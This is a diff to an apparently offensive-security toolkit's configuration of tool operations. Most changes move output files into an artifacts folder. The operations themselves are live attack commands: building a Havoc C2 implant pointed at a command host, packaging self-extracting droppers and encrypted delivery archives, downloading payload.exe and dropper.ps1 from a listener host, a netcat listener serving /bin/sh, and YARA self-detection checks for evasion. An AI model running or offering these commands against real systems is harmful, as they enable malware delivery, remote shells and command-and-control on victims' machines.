@@ -2872,7 +2872,7 @@ inputs = [
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'API Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wl:web/api-endpoints.txt}', '-mc', '200,201,301,302,403', '-of', 'json', '-o', 'ffuf_api.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/api-endpoints.txt}', '-mc', '200,201,301,302,403', '-of', 'json', '-o', '{artifacts}/ffuf_api.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
@@ -2989,7 +2989,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Host Header Fuzz'
-args = ['-u', 'https://{target}', '-H', 'Host: FUZZ.{domain}', '-w', '{wl:dns/hostnames.txt}', '-mc', 'all', '-fs', '0', '-of', 'json', '-o', 'ffuf_vhost.json']
+args = ['-u', 'https://{target}', '-H', 'Host: FUZZ.{domain}', '-w', '{wl:dns/hostnames.txt}', '-mc', 'all', '-fs', '0', '-of', 'json', '-o', '{artifacts}/ffuf_vhost.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
@@ -3114,7 +3114,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Filtered Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,301,302,403', '-t', '{threads}', '-of', 'json', '-o', 'ffuf_content.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,301,302,403', '-t', '{threads}', '-of', 'json', '-o', '{artifacts}/ffuf_content.json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -3223,7 +3223,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Param Fuzz GET'
-args = ['-u', '{url}?FUZZ=test', '-w', '{wl:web/burp-parameter-names.txt}', '-mc', 'all', '-fc', '404', '-of', 'json', '-o', 'ffuf_params.json']
+args = ['-u', '{url}?FUZZ=test', '-w', '{wl:web/burp-parameter-names.txt}', '-mc', 'all', '-fc', '404', '-of', 'json', '-o', '{artifacts}/ffuf_params.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
@@ -3969,7 +3969,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Content Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wl:web/raft-medium.txt}', '-fc', '404', '-t', '{threads}', '-of', 'json', '-o', 'ffuf_dirs.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/raft-medium.txt}', '-fc', '404', '-t', '{threads}', '-of', 'json', '-o', '{artifacts}/ffuf_dirs.json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -5908,12 +5908,12 @@ inputs = [
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json', '-o', 'ffuf_path.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json', '-o', '{artifacts}/ffuf_path.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Parameter Fuzz'
-args = ['-u', '{url}?file=FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json', '-o', 'ffuf_param.json']
+args = ['-u', '{url}?file=FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json', '-o', '{artifacts}/ffuf_param.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
@@ -7321,7 +7321,7 @@ network = false
 binary = 'openssl'
 [[capability.provider.operation]]
 name = 'AES Envelope'
-args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', '{artifacts}/rev.elf', '-out', 'rev.elf.enc', '-pass', 'pass:tsec']
+args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', '{artifacts}/rev.elf', '-out', '{artifacts}/rev.elf.enc', '-pass', 'pass:tsec']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7586,7 +7586,7 @@ network = false
 binary = 'havoc'
 [[capability.provider.operation]]
 name = 'Demon Build'
-args = ['--teamserver', '{c2host}:{c2port}', 'generate', 'demon', '--os', 'windows', '--arch', 'x64', '--format', 'exe']
+args = ['{c2host}:{c2port}', 'generate', 'demon', '--os', 'windows', '--arch', 'x64', '--format', 'exe', '--output', '{artifacts}/havoc_demon.exe']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -7750,7 +7750,7 @@ network = false
 binary = '7z'
 [[capability.provider.operation]]
 name = 'SFX Archive'
-args = ['a', '-sfx', 'dropper_sfx.exe', '{payload}']
+args = ['a', '-sfx', '{artifacts}/dropper_sfx.exe', '{payload}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7768,14 +7768,12 @@ args = ['-w0', '{payload}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'certutil'
+binary = 'curl'
 [[capability.provider.operation]]
 name = 'Windows Encoded Drop'
-args = ['-urlcache', '-split', '-f', 'http://{lhost}:{lport}/payload.exe', 'payload.exe']
+args = ['--max-time', '30', '-sS', '-o', '{artifacts}/payload.exe', 'http://{lhost}:{lport}/payload.exe']
 output = 'lines'
 network = true
-[[capability.provider]]
-binary = 'curl'
 [[capability.provider.operation]]
 name = 'Cradle Render Check'
 args = ['--max-time', '30', '-sk', 'http://{lhost}:{lport}/dropper.ps1']
@@ -7828,14 +7826,14 @@ network = false
 binary = 'objcopy'
 [[capability.provider.operation]]
 name = 'Symbol Strip'
-args = ['--strip-all', '{payload}', 'stripped.bin']
+args = ['--strip-all', '{payload}', '{artifacts}/stripped.bin']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'openssl'
 [[capability.provider.operation]]
 name = 'Encrypt Artifact'
-args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', '{payload}', '-out', 'artifact.enc', '-pass', 'pass:tsec']
+args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', '{payload}', '-out', '{artifacts}/artifact.enc', '-pass', 'pass:tsec']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7863,7 +7861,7 @@ network = false
 binary = 'yara'
 [[capability.provider.operation]]
 name = 'Post Obfuscation Scan'
-args = ['-r', '/usr/share/yara/rules/', '{payload}']
+args = ['-r', '{asset:yara/tsec-payloads.yar}', '{payload}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7884,7 +7882,7 @@ network = false
 binary = 'b2sum'
 [[capability.provider.operation]]
 name = 'Post Hash'
-args = ['stripped.bin']
+args = ['{artifacts}/stripped.bin']
 output = 'lines'
 network = false
 [[capability]]
@@ -7963,7 +7961,7 @@ network = false
 binary = 'checksec'
 [[capability.provider.operation]]
 name = 'Hardening Check'
-args = ['--file={binary}']
+args = ['file', '{binary}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8070,12 +8068,12 @@ inputs = [
 binary = 'yara'
 [[capability.provider.operation]]
 name = 'Signature Scan'
-args = ['-r', '/usr/share/yara/rules/', '{binary}']
+args = ['-r', '{asset:yara/tsec-payloads.yar}', '{binary}']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Recursive Rule Scan'
-args = ['-r', '-s', '/usr/share/yara/malware', '{binary}']
+args = ['-r', '-s', '{asset:yara/tsec-payloads.yar}', '{binary}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8096,7 +8094,7 @@ network = false
 binary = 'checksec'
 [[capability.provider.operation]]
 name = 'Binary Hardening'
-args = ['--file={binary}']
+args = ['file', '{binary}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8298,7 +8296,7 @@ network = true
 binary = 'nc'
 [[capability.provider.operation]]
 name = 'Direct Port Push'
-args = ['-w', '10', '-n', '-l', '{lport}', '-k', '-c', 'sh']
+args = ['-w', '10', '-n', '-l', '{lport}', '-k', '-e', '/bin/sh']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -8319,7 +8317,7 @@ network = false
 binary = '7z'
 [[capability.provider.operation]]
 name = 'Encrypted Delivery Pack'
-args = ['a', '-p', 'delivery.7z', '{payload}']
+args = ['a', '-p', '{artifacts}/delivery.7z', '{payload}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8402,7 +8400,7 @@ network = false
 binary = 'checksec'
 [[capability.provider.operation]]
 name = 'Hardening Verify'
-args = ['--file={binary}']
+args = ['file', '{binary}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8423,7 +8421,7 @@ network = false
 binary = 'yara'
 [[capability.provider.operation]]
 name = 'Self Detection Check'
-args = ['-r', '/usr/share/yara/rules/', '{binary}']
+args = ['-r', '{asset:yara/tsec-payloads.yar}', '{binary}']
 output = 'lines'
 network = false
 [[capability]]
@@ -9018,7 +9016,7 @@ network = true
 binary = 'nc'
 [[capability.provider.operation]]
 name = 'Direct Port Push'
-args = ['-w', '10', '-n', '-l', '{lport}', '-k', '-c', 'sh']
+args = ['-w', '10', '-n', '-l', '{lport}', '-k', '-e', '/bin/sh']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -9039,7 +9037,7 @@ network = false
 binary = '7z'
 [[capability.provider.operation]]
 name = 'Encrypted Delivery Pack'
-args = ['a', '-p', 'delivery.7z', '{payload}']
+args = ['a', '-p', '{artifacts}/delivery.7z', '{payload}']
 output = 'lines'
 network = false
 [[capability.provider]]
